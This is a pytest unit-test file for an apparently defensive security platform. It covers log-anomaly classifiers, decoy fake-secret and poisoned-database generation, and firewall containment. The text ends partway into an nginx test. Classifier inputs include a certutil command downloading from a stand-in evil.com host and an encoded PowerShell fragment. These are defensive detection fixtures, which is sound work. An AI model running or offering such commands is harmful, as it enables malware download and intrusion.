"""
Comprehensive unit tests for NeoVigil Phase 4 and Phase 5 modules,
plus supporting Layer 2 modules (AI Worker, Data Poisoning, Digital Twin).

Test Classes:
    TestAIWorkerClassification   -- src/ai_worker.py
    TestDataPoisonGenerator      -- src/data_poisoning.py
    TestCyberDigitalTwin         -- src/digital_twin.py
    TestContainmentEngine        -- src/contain_engine.py
    TestAdaptEngine              -- src/adapt_engine.py

All tests are pure unit tests using unittest.mock.  No Docker, RabbitMQ,
OpenSearch, or HTTP calls are required.
"""

import json
import os
import uuid
from datetime import datetime
from unittest.mock import MagicMock, patch, PropertyMock

import pytest


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _make_trigger(**overrides):
    """Build a realistic Phase 4/5 trigger payload for reuse across tests."""
    base = {
        "incident_id": "inc-test-0001",
        "trigger_source": "phase3_mtd_complete",
        "prediction_id": "pred-abc123",
        "attacker_ips": ["10.99.1.1", "10.99.1.2"],
        "target_ips": ["192.168.1.50"],
        "kill_chain": [
            {
                "technique_id": "T1595",
                "technique_name": "Active Scanning",
                "tactic": "reconnaissance",
                "target_host": "web-server-01",
                "confidence": 85,
            },
            {
                "technique_id": "T1190",
                "technique_name": "Exploit Public-Facing Application",
                "tactic": "initial_access",
                "target_host": "web-server-01",
                "confidence": 72,
            },
        ],
        "risk_score": 82.5,
        "mtd_action_id": "mtd-action-xyz",
        "timestamp": datetime.utcnow().isoformat(),
    }
    base.update(overrides)
    return base


# ===================================================================
# 1.  AI Worker Edge Filtering  (src/ai_worker.py)
# ===================================================================

class TestAIWorkerClassification:
    """Tests for AIWorker, NetworkAIWorker, EndpointAIWorker, IdentityAIWorker."""

    # -- fixtures -------------------------------------------------------

    @pytest.fixture(autouse=True)
    def _patch_opensearch(self):
        """Prevent real OpenSearch connections during import and init."""
        mock_os_client = MagicMock()
        with patch("src.ai_worker.get_opensearch_client", return_value=mock_os_client):
            from src.ai_worker import (
                AIWorker,
                NetworkAIWorker,
                EndpointAIWorker,
                IdentityAIWorker,
            )
            self.AIWorker = AIWorker
            self.NetworkAIWorker = NetworkAIWorker
            self.EndpointAIWorker = EndpointAIWorker
            self.IdentityAIWorker = IdentityAIWorker
            self.mock_os_client = mock_os_client
            yield

    def _make_worker(self, cls=None):
        cls = cls or self.NetworkAIWorker
        return cls()

    # -- classification: pattern matching --------------------------------

    def test_classify_network_port_scan(self):
        """NetworkAIWorker detects 'port scan' via regex pattern matching."""
        worker = self._make_worker(self.NetworkAIWorker)
        result = worker.classify({"message": "Detected port scan from 10.0.0.5"})
        assert result["is_anomaly"] is True
        assert result["score"] == 0.95
        assert "pattern_match" in result["reason"]

    def test_classify_network_c2_beacon(self):
        """NetworkAIWorker detects C2 beaconing keywords."""
        worker = self._make_worker(self.NetworkAIWorker)
        result = worker.classify({"message": "Suspected C2 beacon traffic on port 443"})
        assert result["is_anomaly"] is True
        assert result["score"] == 0.95

    def test_classify_network_cobalt_strike(self):
        """NetworkAIWorker detects Cobalt Strike references."""
        worker = self._make_worker(self.NetworkAIWorker)
        result = worker.classify({"message": "Cobalt Strike payload detected in HTTP POST"})
        assert result["is_anomaly"] is True

    def test_classify_endpoint_mimikatz(self):
        """EndpointAIWorker detects mimikatz execution."""
        worker = self._make_worker(self.EndpointAIWorker)
        result = worker.classify({"message": "Process mimikatz.exe spawned under SYSTEM"})
        assert result["is_anomaly"] is True
        assert result["score"] == 0.95

    def test_classify_endpoint_powershell_encoded(self):
        """EndpointAIWorker detects encoded PowerShell commands."""
        worker = self._make_worker(self.EndpointAIWorker)
        result = worker.classify({"message": "powershell.exe -enc SQBtAHAAbwByAH..."})
        assert result["is_anomaly"] is True

    def test_classify_endpoint_lolbin_certutil(self):
        """EndpointAIWorker detects certutil download (LOLBin)."""
        worker = self._make_worker(self.EndpointAIWorker)
        result = worker.classify({"message": "certutil.exe -urlcache -split -f http://evil.com/payload"})
        assert result["is_anomaly"] is True

    def test_classify_identity_brute_force(self):
        """IdentityAIWorker detects brute force attack patterns."""
        worker = self._make_worker(self.IdentityAIWorker)
        result = worker.classify({"message": "Brute force detected: 500 failed logins for admin"})
        assert result["is_anomaly"] is True

    def test_classify_identity_kerberoasting(self):
        """IdentityAIWorker detects kerberoasting attempts."""
        worker = self._make_worker(self.IdentityAIWorker)
        result = worker.classify({"message": "Kerberoast ticket request from 10.0.0.99"})
        assert result["is_anomaly"] is True

    def test_classify_identity_golden_ticket(self):
        """IdentityAIWorker detects Golden Ticket attacks."""
        worker = self._make_worker(self.IdentityAIWorker)
        result = worker.classify({"message": "Suspicious Golden Ticket usage detected for krbtgt"})
        assert result["is_anomaly"] is True

    # -- classification: benign traffic ----------------------------------

    def test_classify_benign_log_no_match(self):
        """Normal log without suspicious patterns is classified benign when KNN returns similar baseline."""
        worker = self._make_worker(self.NetworkAIWorker)
        # KNN returns high similarity (= low anomaly score)
        self.mock_os_client.search.return_value = {
            "hits": {"hits": [{"_score": 15.0}]}
        }
        result = worker.classify({"message": "User alice logged in successfully"})
        assert result["is_anomaly"] is False
        assert result["reason"] == "benign"

    def test_classify_empty_log(self):
        """Empty dict log falls through to KNN (json.dumps({}) is not empty)."""
        worker = self._make_worker(self.NetworkAIWorker)
        # _extract_text({}) returns '{}' via json.dumps fallback,
        # which is not empty, so it proceeds to KNN scoring.
        result = worker.classify({})
        assert result["is_anomaly"] is False
        assert result["reason"] == "benign"

    def test_classify_truly_empty_string(self):
        """A bare empty string returns empty_log reason."""
        worker = self._make_worker(self.NetworkAIWorker)
        result = worker.classify("")
        assert result["is_anomaly"] is False
        assert result["reason"] == "empty_log"
        assert result["score"] == 0.0

    # -- classification: KNN fallback ------------------------------------

    def test_classify_knn_no_baseline_flags_anomaly(self):
        """When KNN returns no hits (no baseline data), score defaults to 0.70 which exceeds default network threshold (0.65)."""
        worker = self._make_worker(self.NetworkAIWorker)
        self.mock_os_client.search.return_value = {"hits": {"hits": []}}
        result = worker.classify({"message": "Some unknown activity"})
        assert result["is_anomaly"] is True
        assert result["score"] == 0.70
        assert result["reason"] == "knn_anomaly"

    def test_classify_knn_exception_returns_benign(self):
        """When KNN query raises an exception, score is None and log is treated as benign."""
        worker = self._make_worker(self.NetworkAIWorker)
        self.mock_os_client.search.side_effect = Exception("connection refused")
        result = worker.classify({"message": "Some log entry without patterns"})
        assert result["is_anomaly"] is False
        assert result["reason"] == "benign"

    def test_classify_knn_high_similarity_is_benign(self):
        """High BM25 similarity score means the log is similar to known-good baseline, therefore benign."""
        worker = self._make_worker(self.NetworkAIWorker)
        self.mock_os_client.search.return_value = {
            "hits": {"hits": [{"_score": 18.0}, {"_score": 12.0}]}
        }
        result = worker.classify({"message": "Standard DHCP renewal request"})
        # normalized = 1 - (18/20) = 0.10, below threshold
        assert result["is_anomaly"] is False
        assert result["score"] == pytest.approx(0.10, abs=0.01)

    def test_classify_knn_low_similarity_is_anomaly(self):
        """Low BM25 similarity means the log is dissimilar to baseline, triggering anomaly."""
        worker = self._make_worker(self.NetworkAIWorker)
        self.mock_os_client.search.return_value = {
            "hits": {"hits": [{"_score": 2.0}]}
        }
        result = worker.classify({"message": "Unusual encrypted traffic burst"})
        # normalized = 1 - (2/20) = 0.90, above threshold
        assert result["is_anomaly"] is True
        assert result["score"] == pytest.approx(0.90, abs=0.01)

    # -- _extract_text ---------------------------------------------------

    def test_extract_text_from_string(self):
        """_extract_text handles plain string input."""
        worker = self._make_worker()
        assert worker._extract_text("hello world") == "hello world"

    def test_extract_text_from_dict_message_field(self):
        """_extract_text prefers the 'message' field of a log dict."""
        worker = self._make_worker()
        assert worker._extract_text({"message": "test log", "other": "x"}) == "test log"

    def test_extract_text_fallback_to_json(self):
        """_extract_text serializes dict when no standard field is found."""
        worker = self._make_worker()
        result = worker._extract_text({"custom_field": "value"})
        assert "custom_field" in result

    # -- should_escalate -------------------------------------------------

    def test_should_escalate_true(self):
        """should_escalate returns True when classification is_anomaly is True."""
        worker = self._make_worker()
        assert worker.should_escalate({"is_anomaly": True, "score": 0.9}) is True

    def test_should_escalate_false(self):
        """should_escalate returns False when classification is_anomaly is False."""
        worker = self._make_worker()
        assert worker.should_escalate({"is_anomaly": False, "score": 0.1}) is False

    def test_should_escalate_missing_key(self):
        """should_escalate defaults to False when is_anomaly key is absent."""
        worker = self._make_worker()
        assert worker.should_escalate({}) is False

    # -- escalate --------------------------------------------------------

    def test_escalate_publishes_to_rabbitmq(self):
        """escalate() publishes enriched alert to alert_critical queue via RabbitMQ channel."""
        worker = self._make_worker()
        mock_channel = MagicMock()
        log_record = {"message": "port scan detected"}
        classification = {"score": 0.95, "reason": "pattern_match:port\\s*scan"}

        worker.escalate(log_record, classification, mock_channel)

        mock_channel.basic_publish.assert_called_once()
        call_kwargs = mock_channel.basic_publish.call_args
        # basic_publish is called with keyword args
        body = json.loads(call_kwargs.kwargs.get("body", call_kwargs[1].get("body", "{}")))
        assert body["domain"] == "network"
        assert body["anomaly_score"] == 0.95
        assert body["original_log"] == log_record
        assert worker.stats["escalated"] == 1

    # -- process_message -------------------------------------------------

    def test_process_message_anomalous_escalates(self):
        """process_message escalates when classify returns is_anomaly=True."""
        worker = self._make_worker()
        mock_ch = MagicMock()
        mock_method = MagicMock()
        mock_method.delivery_tag = 1

        body = json.dumps({"message": "nmap scan from 10.0.0.5"}).encode()
        worker.process_message(mock_ch, mock_method, None, body)

        assert worker.stats["escalated"] == 1
        assert worker.stats["dropped"] == 0
        mock_ch.basic_ack.assert_called_once_with(delivery_tag=1)

    def test_process_message_benign_drops(self):
        """process_message drops benign logs (not escalated)."""
        worker = self._make_worker()
        self.mock_os_client.search.return_value = {
            "hits": {"hits": [{"_score": 18.0}]}
        }
        mock_ch = MagicMock()
        mock_method = MagicMock()
        mock_method.delivery_tag = 2

        body = json.dumps({"message": "User logged in normally"}).encode()
        worker.process_message(mock_ch, mock_method, None, body)

        assert worker.stats["dropped"] == 1
        assert worker.stats["escalated"] == 0
        mock_ch.basic_ack.assert_called_once_with(delivery_tag=2)

    def test_process_message_invalid_json(self):
        """process_message handles non-JSON bodies gracefully by wrapping in {raw: ...}."""
        worker = self._make_worker()
        self.mock_os_client.search.return_value = {
            "hits": {"hits": [{"_score": 18.0}]}
        }
        mock_ch = MagicMock()
        mock_method = MagicMock()
        mock_method.delivery_tag = 3

        body = b"not valid json at all"
        worker.process_message(mock_ch, mock_method, None, body)

        assert worker.stats["processed"] == 1
        mock_ch.basic_ack.assert_called_once()

    # -- domain-specific workers have correct config ---------------------

    def test_network_worker_config(self):
        """NetworkAIWorker has correct domain, queue, and threshold."""
        worker = self._make_worker(self.NetworkAIWorker)
        assert worker.DOMAIN == "network"
        assert worker.INPUT_QUEUE == "ai_worker_network"
        assert len(worker.PATTERNS) > 0

    def test_endpoint_worker_config(self):
        """EndpointAIWorker has correct domain, queue, and threshold."""
        worker = self._make_worker(self.EndpointAIWorker)
        assert worker.DOMAIN == "endpoint"
        assert worker.INPUT_QUEUE == "ai_worker_endpoint"

    def test_identity_worker_config(self):
        """IdentityAIWorker has correct domain, queue, and threshold."""
        worker = self._make_worker(self.IdentityAIWorker)
        assert worker.DOMAIN == "identity"
        assert worker.INPUT_QUEUE == "ai_worker_identity"


# ===================================================================
# 2.  Data Poisoning Generator  (src/data_poisoning.py)
# ===================================================================

class TestDataPoisonGenerator:
    """Tests for DataPoisonGenerator: fake secrets, poisoned DB, canary tokens."""

    @pytest.fixture(autouse=True)
    def _patch_deps(self):
        """Patch OpenSearch to prevent real connections."""
        with patch("src.data_poisoning.get_opensearch_client", return_value=MagicMock()), \
             patch("src.data_poisoning.upload_to_opensearch", return_value=True):
            from src.data_poisoning import (
                DataPoisonGenerator,
                _random_aws_key,
                _random_ip,
                _canary_url,
                _random_string,
            )
            self.DataPoisonGenerator = DataPoisonGenerator
            self._random_aws_key = _random_aws_key
            self._random_ip = _random_ip
            self._canary_url = _canary_url
            self._random_string = _random_string
            yield

    # -- helper functions ------------------------------------------------

    def test_random_aws_key_format(self):
        """Generated AWS key IDs start with AKIA and have correct length."""
        key_id, secret = self._random_aws_key()
        assert key_id.startswith("AKIA")
        assert len(key_id) == 20  # AKIA + 16 chars
        assert len(secret) == 40

    def test_random_ip_format(self):
        """Generated IPs belong to the 10.x.x.x private range."""
        ip = self._random_ip()
        parts = ip.split(".")
        assert parts[0] == "10"
        assert len(parts) == 4
        for part in parts:
            assert 0 <= int(part) <= 255

    def test_canary_url_format(self):
        """Canary URL contains the expected domain and token ID."""
        url = self._canary_url("abc123")
        assert "monitor.internal.corp" in url
        assert "abc123" in url
        assert url.startswith("https://")

    def test_random_string_length(self):
        """_random_string generates string of requested length."""
        s = self._random_string(32)
        assert len(s) == 32

    # -- generate_fake_secrets -------------------------------------------

    def test_generate_fake_secrets_structure(self):
        """Generated secrets contain AWS, database, API tokens, SSH keys, and monitoring endpoints."""
        gen = self.DataPoisonGenerator()
        profile = {"service_name": "web_app", "decoy_id": "decoy-001"}
        secrets = gen.generate_fake_secrets(profile)

        assert "aws" in secrets
        assert secrets["aws"]["access_key_id"].startswith("AKIA")
        assert "database" in secrets
        assert "username" in secrets["database"]
        assert "password" in secrets["database"]
        assert "api_tokens" in secrets
        assert secrets["api_tokens"]["github_pat"].startswith("ghp_")
        assert "ssh_keys" in secrets
        assert "monitoring_endpoints" in secrets
        assert len(secrets["monitoring_endpoints"]) == 3  # 3 canary tokens

    def test_generate_fake_secrets_service_name_in_fields(self):
        """Service name is embedded in database username and bucket name."""
        gen = self.DataPoisonGenerator()
        profile = {"service_name": "payments", "decoy_id": "decoy-002"}
        secrets = gen.generate_fake_secrets(profile)

        assert "payments" in secrets["database"]["username"]
        assert "payments" in secrets["database"]["database"]
        assert "payments" in secrets["aws"]["s3_bucket"]

    def test_generate_fake_secrets_different_each_call(self):
        """Two calls produce different credentials (randomness check)."""
        gen = self.DataPoisonGenerator()
        profile = {"service_name": "api_server", "decoy_id": "decoy-003"}
        s1 = gen.generate_fake_secrets(profile)
        s2 = gen.generate_fake_secrets(profile)

        assert s1["aws"]["access_key_id"] != s2["aws"]["access_key_id"]
        assert s1["database"]["password"] != s2["database"]["password"]

    def test_generate_fake_secrets_default_profile(self):
        """Secrets generation works with an empty profile (uses defaults)."""
        gen = self.DataPoisonGenerator()
        secrets = gen.generate_fake_secrets({})

        assert "aws" in secrets
        assert "generic" in secrets["database"]["username"]

    # -- generate_poisoned_db --------------------------------------------

    def test_generate_poisoned_db_contains_sql(self):
        """Generated SQL contains CREATE TABLE and INSERT statements."""
        gen = self.DataPoisonGenerator()
        profile = {"service_name": "crm", "decoy_id": "decoy-004"}
        sql = gen.generate_poisoned_db(profile)

        assert "CREATE TABLE" in sql
        assert "INSERT INTO" in sql
        assert "employee_credentials" in sql

    def test_generate_poisoned_db_has_canary_urls(self):
        """Poisoned DB includes canary token URLs in api_configurations."""
        gen = self.DataPoisonGenerator()
        profile = {"service_name": "crm", "decoy_id": "decoy-005"}
        sql = gen.generate_poisoned_db(profile)

        assert "monitor.internal.corp" in sql

    def test_generate_poisoned_db_has_contradictions(self):
        """Poisoned DB includes contradictory data designed to confuse AI tools."""
        gen = self.DataPoisonGenerator()
        sql = gen.generate_poisoned_db({"service_name": "test"})

        # Check for contradictory financial data
        assert "99999999.99" in sql  # absurd amount
        assert "SUPERSECRET_LEVEL_99" in sql  # impossible status

    def test_generate_poisoned_db_has_circular_refs(self):
        """Poisoned DB includes circular reference chains in system_config."""
        gen = self.DataPoisonGenerator()
        sql = gen.generate_poisoned_db({"service_name": "test"})

        assert "SEE: backup_key" in sql
        assert "SEE: recovery_key" in sql
        assert "SEE: master_key" in sql

    def test_generate_poisoned_db_service_name_header(self):
        """SQL dump header includes the service name."""
        gen = self.DataPoisonGenerator()
        sql = gen.generate_poisoned_db({"service_name": "billing"})
        assert "billing" in sql.split("\n")[0]

    # -- generate_canary_tokens ------------------------------------------

    def test_generate_canary_tokens_count(self):
        """Requested number of canary tokens are generated."""
        gen = self.DataPoisonGenerator()
        tokens = gen.generate_canary_tokens(5)
        assert len(tokens) == 5

    def test_generate_canary_tokens_uniqueness(self):
        """Each canary token has a unique token_id and URL."""
        gen = self.DataPoisonGenerator()
        tokens = gen.generate_canary_tokens(10)
        ids = [t["token_id"] for t in tokens]
        urls = [t["url"] for t in tokens]
        assert len(set(ids)) == 10
        assert len(set(urls)) == 10

    def test_generate_canary_tokens_structure(self):
        """Each token has token_id, url, and created_at fields."""
        gen = self.DataPoisonGenerator()
        tokens = gen.generate_canary_tokens(1)
        token = tokens[0]
        assert "token_id" in token
        assert "url" in token
        assert "created_at" in token
        assert token["url"].startswith("https://")

    # -- _track_asset ----------------------------------------------------

    def test_track_asset_calls_opensearch(self):
        """_track_asset uploads asset tracking document to OpenSearch."""
        with patch("src.data_poisoning.upload_to_opensearch") as mock_upload:
            gen = self.DataPoisonGenerator()
            gen._track_asset("decoy-010", "fake_secrets", ["tok-1", "tok-2"])
            mock_upload.assert_called_once()
            call_kwargs = mock_upload.call_args
            doc = call_kwargs[0][0]
            assert doc["decoy_id"] == "decoy-010"
            assert doc["asset_type"] == "fake_secrets"
            assert doc["canary_tokens"] == ["tok-1", "tok-2"]
            assert doc["status"] == "ACTIVE"

    def test_track_asset_no_opensearch_graceful(self):
        """_track_asset does nothing when upload_to_opensearch is unavailable."""
        with patch("src.data_poisoning.upload_to_opensearch", None):
            gen = self.DataPoisonGenerator()
            # Should not raise
            gen._track_asset("decoy-011", "poisoned_db", [])


# ===================================================================
# 3.  Cyber Digital Twin  (src/digital_twin.py)
# ===================================================================

class TestCyberDigitalTwin:
    """Tests for CyberDigitalTwin in mock mode (no Docker)."""

    @pytest.fixture(autouse=True)
    def _patch_deps(self):
        """Patch Docker and OpenSearch to force mock mode."""
        with patch("src.digital_twin.DOCKER_AVAILABLE", False), \
             patch("src.digital_twin.get_opensearch_client", return_value=None), \
             patch("src.digital_twin.upload_to_opensearch", None):
            from src.digital_twin import CyberDigitalTwin
            self.CyberDigitalTwin = CyberDigitalTwin
            yield

    # -- run_validation_suite (mock mode) --------------------------------

    def test_validation_suite_passes_in_mock_mode(self):
        """Full validation suite passes in mock mode (no Docker)."""
        twin = self.CyberDigitalTwin()
        result = twin.run_validation_suite(
            target_service="web-server-01",
            mutation_plan={"action_type": "migration"},
        )
        assert result["valid"] is True
        assert result["target_service"] == "web-server-01"
        assert result["mutation_type"] == "migration"
        assert len(result["issues"]) == 0
        assert "total_duration_ms" in result["metrics"]

    def test_validation_suite_contains_twin_id(self):
        """Validation report contains a unique twin_id."""
        twin = self.CyberDigitalTwin()
        result = twin.run_validation_suite("svc-01", {"action_type": "obfuscation"})
        assert result["twin_id"].startswith("twin-")

    def test_validation_suite_metrics_populated(self):
        """Validation metrics include mutation_applied, health_check, connectivity, and response_time."""
        twin = self.CyberDigitalTwin()
        result = twin.run_validation_suite("svc-02", {"action_type": "migration"})
        metrics = result["metrics"]
        assert metrics["mutation_applied"] is True
        assert metrics["health_check_passed"] is True
        assert metrics["health_check_attempts"] == 1
        assert metrics["connectivity_passed"] is True
        assert metrics["response_time_ms"] == 50  # mock default

    # -- create_twin (mock) ----------------------------------------------

    def test_create_twin_mock_succeeds(self):
        """create_twin in mock mode always returns success."""
        twin = self.CyberDigitalTwin()
        result = twin.create_twin("twin-001", "web-server", {})
        assert result["success"] is True
        assert result["container_id"].startswith("mock-")
        assert "twin-001" in twin.active_twins

    def test_create_twin_stores_in_active_twins(self):
        """create_twin adds twin metadata to active_twins dict."""
        twin = self.CyberDigitalTwin()
        twin.create_twin("twin-002", "db-server", {})
        info = twin.active_twins["twin-002"]
        assert info["service"] == "db-server"
        assert info["mock"] is True

    # -- simulate_mutation (mock) ----------------------------------------

    def test_simulate_mutation_mock_succeeds(self):
        """simulate_mutation in mock mode returns applied=True."""
        twin = self.CyberDigitalTwin()
        twin.create_twin("twin-003", "svc", {})
        result = twin.simulate_mutation("twin-003", {"action_type": "migration"})
        assert result["applied"] is True

    def test_simulate_mutation_unknown_twin_fails(self):
        """simulate_mutation returns error when twin_id does not exist."""
        twin = self.CyberDigitalTwin()
        result = twin.simulate_mutation("nonexistent-twin", {})
        assert result["applied"] is False
        assert "Twin not found" in result["error"]

    # -- validate_health (mock) ------------------------------------------

    def test_validate_health_mock_passes(self):
        """validate_health in mock mode passes with 1 attempt."""
        twin = self.CyberDigitalTwin()
        twin.create_twin("twin-004", "svc", {})
        result = twin.validate_health("twin-004")
        assert result["passed"] is True
        assert result["attempts"] == 1

    def test_validate_health_unknown_twin_fails(self):
        """validate_health returns failure for nonexistent twin."""
        twin = self.CyberDigitalTwin()
        result = twin.validate_health("nonexistent")
        assert result["passed"] is False

    # -- validate_connectivity (mock) ------------------------------------

    def test_validate_connectivity_mock_passes(self):
        """validate_connectivity in mock mode always passes."""
        twin = self.CyberDigitalTwin()
        twin.create_twin("twin-005", "svc", {})
        result = twin.validate_connectivity("twin-005", ["peer-1"])
        assert result["passed"] is True
        assert result["failures"] == []

    # -- validate_response_time (mock) -----------------------------------

    def test_validate_response_time_mock(self):
        """validate_response_time in mock mode returns 50ms."""
        twin = self.CyberDigitalTwin()
        twin.create_twin("twin-006", "svc", {})
        result = twin.validate_response_time("twin-006")
        assert result["avg_ms"] == 50

    # -- cleanup_twin ----------------------------------------------------

    def test_cleanup_twin_removes_from_active(self):
        """cleanup_twin removes twin from active_twins dict."""
        twin = self.CyberDigitalTwin()
        twin.create_twin("twin-007", "svc", {})
        assert "twin-007" in twin.active_twins
        twin.cleanup_twin("twin-007")
        assert "twin-007" not in twin.active_twins

    def test_cleanup_nonexistent_twin_is_noop(self):
        """cleanup_twin on a nonexistent twin does not raise."""
        twin = self.CyberDigitalTwin()
        twin.cleanup_twin("ghost-twin")  # should not raise

    # -- error handling in validation suite ------------------------------

    def test_validation_suite_handles_create_failure(self):
        """When create_twin fails, validation report is marked invalid."""
        twin = self.CyberDigitalTwin()
        with patch.object(twin, "create_twin", return_value={"success": False, "error": "disk full"}):
            result = twin.run_validation_suite("svc", {"action_type": "migration"})
        assert result["valid"] is False
        assert any("Twin creation failed" in issue for issue in result["issues"])

    def test_validation_suite_handles_mutation_failure(self):
        """When simulate_mutation fails, validation report is marked invalid."""
        twin = self.CyberDigitalTwin()
        with patch.object(twin, "simulate_mutation", return_value={"applied": False, "error": "timeout"}):
            result = twin.run_validation_suite("svc", {"action_type": "migration"})
        assert result["valid"] is False
        assert any("Mutation application failed" in issue for issue in result["issues"])


# ===================================================================
# 4.  Containment Engine  (src/contain_engine.py)
# ===================================================================

class TestContainmentEngine:
    """Tests for ContainmentEngine: playbook generation, firewall blocking, IaC patches."""

    @pytest.fixture(autouse=True)
    def _patch_deps(self):
        """Patch all external dependencies for ContainmentEngine."""
        mock_os_client = MagicMock()
        mock_os_client.indices.exists.return_value = True

        self.mock_upload = MagicMock(return_value=True)
        self.mock_llm = MagicMock()
        self.mock_firewall = MagicMock()
        self.mock_firewall.block_ip.return_value = True
        self.mock_audit = MagicMock()
        self.mock_build_stix = MagicMock(return_value={"id": "bundle--test", "objects": []})

        with patch("src.contain_engine.get_opensearch_client", return_value=mock_os_client), \
             patch("src.contain_engine.upload_to_opensearch", self.mock_upload), \
             patch("src.contain_engine.LLMClient", return_value=self.mock_llm), \
             patch("src.contain_engine.FirewallClient", return_value=self.mock_firewall), \
             patch("src.contain_engine.AuditLogger", return_value=self.mock_audit), \
             patch("src.contain_engine.build_stix_bundle", self.mock_build_stix):
            from src.contain_engine import ContainmentEngine
            self.ContainmentEngine = ContainmentEngine
            self.mock_os_client = mock_os_client
            yield

    # -- generate_playbook -----------------------------------------------

    def test_generate_playbook_returns_document(self):
        """generate_playbook produces a playbook document with expected fields."""
        engine = self.ContainmentEngine()
        self.mock_llm._call_openai_chat.return_value = [
            {"action_id": "act-1", "action_type": "FIREWALL_BLOCK", "target": "10.0.0.1",
             "parameters": {}, "priority": 1, "timeout_seconds": 30},
        ]
        self.mock_os_client.search.return_value = {"hits": {"hits": []}}

        trigger = _make_trigger()
        playbook = engine.generate_playbook(trigger)

        assert playbook["playbook_id"].startswith("pb-")
        assert playbook["incident_id"] == "inc-test-0001"
        assert playbook["status"] == "GENERATED"
        assert playbook["generated_by"] == "ContainmentEngine-LLM"
        assert isinstance(playbook["playbook_actions"], list)

    def test_generate_playbook_with_llm_actions(self):
        """When LLM returns a list of actions, they are used as playbook_actions."""
        engine = self.ContainmentEngine()
        llm_actions = [
            {"action_id": "act-1", "action_type": "ISOLATE_HOST", "target": "web-server",
             "parameters": {"vlan": "quarantine"}, "priority": 1, "timeout_seconds": 60},
            {"action_id": "act-2", "action_type": "ROTATE_CREDS", "target": "all",
             "parameters": {}, "priority": 2, "timeout_seconds": 300},
        ]
        self.mock_llm._call_openai_chat.return_value = llm_actions
        self.mock_os_client.search.return_value = {"hits": {"hits": []}}

        playbook = engine.generate_playbook(_make_trigger())
        assert len(playbook["playbook_actions"]) == 2
        assert playbook["playbook_actions"][0]["action_type"] == "ISOLATE_HOST"

    def test_generate_playbook_llm_dict_with_actions_key(self):
        """When LLM returns a dict with 'actions' key, those actions are extracted."""
        engine = self.ContainmentEngine()
        self.mock_llm._call_openai_chat.return_value = {
            "actions": [{"action_id": "act-1", "action_type": "BLOCK"}]
        }
        self.mock_os_client.search.return_value = {"hits": {"hits": []}}

        playbook = engine.generate_playbook(_make_trigger())
        assert playbook["playbook_actions"][0]["action_type"] == "BLOCK"

    def test_generate_playbook_fallback_when_no_llm(self):
        """When LLM is None, fallback playbook is generated with standard actions."""
        engine = self.ContainmentEngine()
        engine.llm = None

        trigger = _make_trigger()
        playbook = engine.generate_playbook(trigger)

        actions = playbook["playbook_actions"]
        action_types = [a["action_type"] for a in actions]
        assert "FIREWALL_BLOCK" in action_types
        assert "CREDENTIAL_ROTATION" in action_types
        assert "EVIDENCE_PRESERVATION" in action_types
        assert "NOTIFICATION" in action_types

    def test_generate_playbook_fallback_block_count(self):
        """Fallback playbook generates one FIREWALL_BLOCK per attacker IP."""
        engine = self.ContainmentEngine()
        engine.llm = None

        trigger = _make_trigger(attacker_ips=["10.1.1.1", "10.1.1.2", "10.1.1.3"])
        playbook = engine.generate_playbook(trigger)
        block_actions = [a for a in playbook["playbook_actions"] if a["action_type"] == "FIREWALL_BLOCK"]
        assert len(block_actions) == 3

    def test_generate_playbook_llm_exception_uses_fallback(self):
        """When LLM raises an exception, fallback playbook is used."""
        engine = self.ContainmentEngine()
        self.mock_llm._call_openai_chat.side_effect = Exception("LLM timeout")
        self.mock_os_client.search.return_value = {"hits": {"hits": []}}

        playbook = engine.generate_playbook(_make_trigger())
        assert any(a["action_type"] == "FIREWALL_BLOCK" for a in playbook["playbook_actions"])

    def test_generate_playbook_stores_in_opensearch(self):
        """Playbook document is uploaded to OpenSearch."""
        engine = self.ContainmentEngine()
        engine.llm = None
        engine.generate_playbook(_make_trigger())
        self.mock_upload.assert_called()

    def test_generate_playbook_audit_logged(self):
        """Playbook generation is recorded in audit log."""
        engine = self.ContainmentEngine()
        engine.llm = None
        engine.generate_playbook(_make_trigger())
        self.mock_audit.log_event.assert_called()
        call_kwargs = self.mock_audit.log_event.call_args[1]
        assert call_kwargs["action"] == "PLAYBOOK_GENERATED"

    def test_generate_playbook_stix_bundle_called(self):
        """STIX bundle is built from trigger data when build_stix_bundle is available."""
        engine = self.ContainmentEngine()
        engine.llm = None
        self.mock_os_client.search.return_value = {"hits": {"hits": []}}
        engine.generate_playbook(_make_trigger())
        self.mock_build_stix.assert_called_once()

    # -- execute_firewall_blocks -----------------------------------------

    def test_execute_firewall_blocks_success(self):
        """Firewall blocks are executed for each attacker IP."""
        engine = self.ContainmentEngine()
        results = engine.execute_firewall_blocks("inc-001", ["10.0.0.1", "10.0.0.2"])

        assert len(results) == 2
        assert all(r["success"] is True for r in results)
        assert self.mock_firewall.block_ip.call_count == 2

    def test_execute_firewall_blocks_partial_failure(self):
        """When firewall fails for one IP, other IPs are still processed."""
        engine = self.ContainmentEngine()
        self.mock_firewall.block_ip.side_effect = [True, False, True]

        results = engine.execute_firewall_blocks("inc-002", ["10.0.0.1", "10.0.0.2", "10.0.0.3"])
        successes = [r for r in results if r["success"]]
        failures = [r for r in results if not r["success"]]
        assert len(successes) == 2
        assert len(failures) == 1

    def test_execute_firewall_blocks_caps_at_20(self):
        """Firewall blocks are capped at 20 IPs per incident."""
        engine = self.ContainmentEngine()
        ips = [f"10.0.0.{i}" for i in range(30)]
        results = engine.execute_firewall_blocks("inc-003", ips)
        assert len(results) == 20

    def test_execute_firewall_blocks_audit_log(self):
        """Each firewall block action is recorded in audit log."""
        engine = self.ContainmentEngine()
        engine.execute_firewall_blocks("inc-004", ["10.0.0.1"])
        self.mock_audit.log_event.assert_called()
        call_kwargs = self.mock_audit.log_event.call_args[1]
        assert call_kwargs["action"] == "FIREWALL_BLOCK"
        assert call_kwargs["target"] == "10.0.0.1"

    def test_execute_firewall_blocks_opensearch_indexed(self):
        """Each block action is indexed to OpenSearch."""
        engine = self.ContainmentEngine()
        engine.execute_firewall_blocks("inc-005", ["10.0.0.1", "10.0.0.2"])
        assert self.mock_upload.call_count >= 2

    def test_execute_firewall_blocks_empty_list(self):
        """Empty attacker IP list produces no results."""
        engine = self.ContainmentEngine()
        results = engine.execute_firewall_blocks("inc-006", [])
        assert results == []

    def test_execute_firewall_blocks_mock_mode_no_firewall(self):
        """When firewall client is None (mock mode), blocks still succeed."""
        engine = self.ContainmentEngine()
        engine.firewall = None
        results = engine.execute_firewall_blocks("inc-007", ["10.0.0.1"])
        assert len(results) == 1
        assert results[0]["success"] is True

    # -- analyze_and_patch_configs --------------------------------------

    def test_analyze_nginx_config_generates_deny_list(self):
